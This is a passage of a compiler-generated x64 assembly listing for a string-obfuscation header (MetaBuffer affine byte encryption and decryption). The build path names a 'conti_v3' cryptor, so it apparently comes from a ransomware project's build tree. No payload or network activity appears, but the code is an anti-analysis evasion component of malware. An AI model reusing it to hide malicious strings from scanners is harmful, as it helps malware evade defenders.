; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ; MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ; MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ; MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ; MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ; MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00107	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  0010b	88 85 c0 00 00
	00		 mov	 BYTE PTR tv133[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00111	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00118	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  0011f	5f		 pop	 rdi
  00120	5d		 pop	 rbp
  00121	c3		 ret	 0
??0?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z PROC ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 11	 sub	 eax, 17
  0002d	6b c0 25	 imul	 eax, eax, 37		; 00000025H
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z PROC ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 67	 imul	 eax, eax, 103		; 00000067H
  0002d	83 c0 11	 add	 eax, 17
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEBA_NXZ ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 50	 cmp	 QWORD PTR i$1[rbp], 80	; 00000050H
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEBA_NXZ PROC ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv658 = 192
this$ = 240
data$ = 248
